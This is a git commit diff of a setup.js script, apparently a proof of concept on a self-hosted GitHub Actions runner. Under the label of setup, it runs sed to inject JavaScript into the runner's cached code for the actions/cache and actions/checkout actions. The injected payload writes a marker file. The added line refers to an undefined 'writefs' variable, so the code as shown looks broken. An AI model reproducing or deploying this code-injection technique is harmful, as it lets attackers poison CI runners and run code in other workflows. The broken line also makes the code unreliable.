f5f0ec334cf6cb3a9adb87ad71e711285ef1f463
musset0 <musset025@gmail.com>
2023-09-04 13:45:34 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -16,9 +16,9 @@ console.log("this is a setup.....")
 // });
 
 
-let writecontent = 'const cacheKey = yield cache.restoreCache(cachePaths, primaryKey + "1", restoreKeys);const fs = __importStar(__webpack_require__(747));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
+let writecontent = 'const fs = __importStar(__webpack_require__(747));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';
 
-cl_process.exec(`sed -i '47734s/.*/${writecontent}/'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+cl_process.exec(`sed -i '1839i ${writefs}'  /home/musset/Documents/actions-runner/_work/_actions/actions/checkout/v3/dist/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
